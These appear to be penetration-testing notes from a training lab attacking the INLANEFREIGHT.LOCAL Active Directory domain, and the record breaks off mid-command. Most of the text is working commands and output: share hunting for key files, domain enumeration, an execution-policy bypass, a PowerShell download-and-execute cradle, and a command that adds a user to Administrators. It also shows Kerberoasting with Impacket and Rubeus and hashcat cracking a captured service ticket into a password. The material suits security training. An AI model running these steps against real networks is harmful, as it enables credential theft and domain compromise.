.,:::::: :::::::.. ;;;` ``;;;;, `;;; ;;`;; ;;;'''' ;;;'''' ;;; ;;;;'''' ;;;;``;;;; '[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[ [[cccc [[[,/[[[' ''' $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$' $$\"\" $$$$$$c 88b dP 888 Y88 888 888,888 888 o88oo,.__888oo,__ 888b '88bo, 'YMmMY' MMM YM YMM ''` 'MM, 'MM, ''''YUMMM''''YUMMMMMMM 'W' by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler 2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\ADMIN$) 2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\C$) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\\address) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\User Shares) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\ZZZ_archive) 2022-03-31 12:17:18 -07:00 [Share] {Green}(\\\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\\CertEnroll) 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.kdb$|289B|3/31/2022 12:09:22 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\GroupBackup.kdb) .kdb 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.key$|299B|3/31/2022 12:05:33 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ShowReset.key) .key 2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\UpdateServicesPackages) 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.kwallet$|302B|3/31/2022 12:04:45 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WriteUse.kwallet) .kwallet 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.key$|298B|3/31/2022 12:05:10 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ProtectStep.key) .key 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.ppk$|275B|3/31/2022 12:04:40 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\StopTrace.ppk) .ppk 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.key$|301B|3/31/2022 12:09:17 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WaitClear.key) .key 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.sqldump$|312B|3/31/2022 12:05:30 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\DenyRedo.sqldump) .sqldump 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.sqldump$|310B|3/31/2022 12:05:02 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\AddPublish.sqldump) .sqldump 2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\WsusContent) 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.keychain$|295B|3/31/2022 12:08:42 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\SetStep.keychain) .keychain 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.tblk$|279B|3/31/2022 12:05:25 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FindConnect.tblk) .tblk 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.psafe3$|301B|3/31/2022 12:09:33 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\GetUpdate.psafe3) .psafe3 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.keypair$|278B|3/31/2022 12:09:09 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\UnprotectConvertTo.keypair) .keypair 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\.tblk$|280B|3/31/2022 12:05:17 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\ExportJoin.tblk) .tblk 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.mdf$|305B|3/31/2022 12:09:27 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FormatShow.mdf) .mdf 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\.mdf$|299B|3/31/2022 12:09:14 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\LockConfirm.mdf) .mdf \u003cSNIP\u003e group membership\nPS C:\\local\u003e Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse Trust Enumeration Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-DomainTrustMapping SourceName : INLANEFREIGHT.LOCAL TargetName : LOGISTICS.INLANEFREIGHT.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : WITHIN_FOREST TrustDirection : Bidirectional WhenCreated : 11/1/2021 6:20:22 PM WhenChanged : 2/26/2022 11:55:55 PM Test admin access\nPS C:\\local\u003e Test-AdminAccess -ComputerName ACADEMY-EA-MS01 ComputerName IsAdmin ------------ ------- ACADEMY-EA-MS01 True Finding Users With SPN Set Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName serviceprincipalname samaccountname -------------------- -------------- adfsconnect/azure01.inlanefreight.local adfs backupjob/veam001.inlanefreight.local backupagent d0wngrade/kerberoast.inlanefreight.local d0wngrade kadmin/changepw krbtgt MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev MSSQLSvc/SPSJDB.inlanefreight.local:1433 sqlprod MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa sts/inlanefreight.local solarwindsmonitor testspn/kerberoast.inlanefreight.local testspn testspn2/kerberoast.inlanefreight.local testspn2 Living Off the Land Basic Enumeration Commands Command Result hostname Prints the PC‚Äôs Name [System.Environment]::OSVersion.Version Prints out the OS version and revision level wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patches and hotfixes applied to the host ipconfig /all Prints out network adapter state and configurations set Displays a list of environment variables for the current session (ran from CMD-prompt) echo %USERDOMAIN% Displays the domain name to which the host belongs (ran from CMD-prompt) echo %logonserver% Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) Basic Enumeration Harnessing PowerShell Cmd-Let Description Get-Module Lists available modules loaded for use. Get-ExecutionPolicy -List Will print the execution policy settings for each scope on a host. Set-ExecutionPolicy Bypass -Scope Process This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won‚Äôt be making a permanent change to the victim host. Get-ChildItem Env: | ft Key,Value Return environment values such as key paths, users, computer information, etc. Get-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt With this string, we can get the specified user‚Äôs PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); \u003cfollow-on commands\u003e\" powershell.exe -version 2\nFurewall\nPS C:\\local\u003e netsh advfirewall show allprofiles Domain Profile Settings: ---------------------------------------------------------------------- State OFF Firewall Policy BlockInbound,AllowOutbound LocalFirewallRules N/A (GPO-store only) LocalConSecRules N/A (GPO-store only) InboundUserNotification Disable RemoteManagement Disable UnicastResponseToMulticast Enable Checking Defenses PS C:\\local\u003e netsh advfirewall show allprofiles Domain Profile Settings: ---------------------------------------------------------------------- State OFF Firewall Policy BlockInbound,AllowOutbound LocalFirewallRules N/A (GPO-store only) LocalConSecRules N/A (GPO-store only) InboundUserNotification Disable RemoteManagement Disable UnicastResponseToMulticast Enable Logging: windefend antivirus\nC:\\local\u003e sc query windefend SERVICE_NAME: windefend TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PS C:\\local\u003e Get-MpComputerStatus AMEngineVersion : 1.1.19000.8 AMProductVersion : 4.18.2202.4 AMRunningMode : Normal AMServiceEnabled : True AMServiceVersion : 4.18.2202.4 AntispywareEnabled : True AntispywareSignatureAge : 0 AntispywareSignatureLastUpda Am I Alone? PS C:\\local\u003e qwinsta SESSIONNAME USERNAME ID STATE TYPE DEVICE services 0 Disc \u003econsole forend 1 Active rdp-tcp 65536 Listen Network Information Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 \u0026 IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall show allprofiles Using arp -a PS C:\\local\u003e arp -a Interface: 172.16.5.25 --- 0x8 Internet Address Physical Address Type 172.16.5.5 00-50-56-b9-08-26 dynamic 172.16.5.130 00-50-56-b9-f0-e1 dynamic 172.16.5.240 PS C:\\local\u003e route print =========================================================================== Interface List 8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter 1...........................Software Loopback Interface 1 =========================================================================== IPv4 Route Table =========================================================================== Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 172.16.5.1 172.16.5.25 261 0.0.0.0 0.0.0.0 10.129.0.1 10.129.201.234 20 10.129.0.0 255.255.0.0 On-link 10.129.201.234 266 10.129.201.234 255.255.255.255 On-link 10.129.201.234 266 Windows Management Instrumentation (WMI) Quick WMI checks Command Description wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list Displays information about the Domain and Domain Controllers wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list Information about all local groups wmic sysaccount list /format:list Dumps information about any system accounts that are being used as service accounts. Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This cheatsheet has some useful commands for querying host and domain info using wmic.\nNet Commands Table of Useful Net Commands Command Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group \"Domain Admins\" /domain List users with domain admin privileges net group \"domain computers\" /domain List of PCs connected to the domain net group \"Domain Controllers\" /domain List PC accounts of domains controllers net group \u003cdomain_group_name\u003e /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user \u003cACCOUNT_NAME\u003e /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain DSQUERY\nUsers With Specific Attributes Set (PASSWD_NOTREQD) PS C:\\local\u003e dsquery * -filter \"(\u0026(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl distinguishedName userAccountControl CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 66082 CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL 66080 CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL 66080 CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL 66080 CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 546 CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL 544 CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2080 CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Kerberoasting - from Linux Kerberoasting - Performing the Attack Depending on your position in a network, this attack can be performed in multiple ways:\nFrom a non-domain joined Linux host using valid domain user credentials. From a domain-joined Linux host as root after retrieving the keytab file. From a domain-joined Windows host authenticated as a domain user. From a domain-joined Windows host with a shell in the context of a domain account. As SYSTEM on a domain-joined Windows host. From a non-domain joined Windows host using runas /netonly. Several tools can be utilized to perform the a\nRequesting all TGS Tickets Kerberoasting - from Linux\ncube111@local[/local]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------------- ----------------- ---------------------------------------------------------------------------------------- -------------------------- --------- ---------- backupjob/veam001.inlanefreight.local BACKUPAGENT CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:15:40.842452 \u003cnever\u003e sts/inlanefreight.local SOLARWINDSMONITOR CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:14:48.701834 \u003cnever\u003e MSSQLSvc/SPSJDB.inlanefreight.local:1433 sqlprod CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:09:46.326865 \u003cnever\u003e MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:10:06.545598 \u003cnever\u003e MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:13:31.639334 \u003cnever\u003e adfsconnect/azure01.inlanefreight.local adfs CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL 2022-02-15 17:15:27.108079 \u003cnever\u003e $krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d $krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30 \u003cSNIP\u003e cube111@local[/local]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database! Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, TGS-REP Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs) Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 8765440/14344386 (61.11%) Rejected.........: 0/8765440 (0.00%) Restore.Point....: 8749056/14344386 (60.99%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: davius07 -\u003e darten170 Started: Tue Feb 15 17:44:49 2022 Kerberoasting - from Windows Automated / Tool Based Route iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1\nPS C:\\local\u003e Import-Module .\\PowerView.ps1 PS C:\\local\u003e Get-DomainUser * -spn | select samaccountname samaccountname -------------- adfs backupagent krbtgt sqldev sqlprod sqlqa solarwindsmoni Using PowerView to Target a Specific User Kerberoasting - from Windows\nPS C:\\local\u003e Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat SamAccountName : sqldev DistinguishedName : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 TicketByteHexStream : Hash : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001 376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177 AB4FF3CE724FB0809CDA9E30703EDDE93 Viewing the Contents of the .CSV File Kerberoasting - from Windows\nPS C:\\local\u003e cat .\\ilfreight_tgs.csv \"SamAccountName\",\"DistinguishedName\",\"ServicePrincipalName\",\"TicketByteHexStream\",\"Hash\" \"adfs\",\"CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\",\"adfsconnect/azure01.inlanefreight.local\",,\"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1 \u003cSNIP\u003e Using Rubeus Performing Kerberoasting and outputting hashes to a file Using alternate credentials Performing Kerberoasting combined with a pass-the-ticket attack Performing ‚Äúopsec‚Äù Kerberoasting to filter out AES-enabled accounts Requesting tickets for accounts passwords set between a specific date range Placing a limit on the number of tickets requested Performing AES Kerberoasting Using the /stats Flag Kerberoasting - from Windows\nPS C:\\local\u003e .\\Rubeus.exe kerberoast /stats ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Kerberoasting [*] Listing statistics about target users, no ticket requests being performed. [*] Target Domain : INLANEFREIGHT.LOCAL [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' [*] Total kerberoastable users : 9 ------------------------------------------------------------ | Supported Encryption Type | Count | ------------------------------------------------------------ | RC4_HMAC_DEFAULT | 7 | | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2 | ------------------------------------------------------------ ---------------------------------- | Password Last Set Year | Count | ---------------------------------- | 2022 | 9 | ---------------------------------- PS C:\\local\u003e .\\Rubeus.exe kerberoast /user:testspn /nowrap [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target User : testspn [*] Target Domain : INLANEFREIGHT.LOCAL [*] Searching path 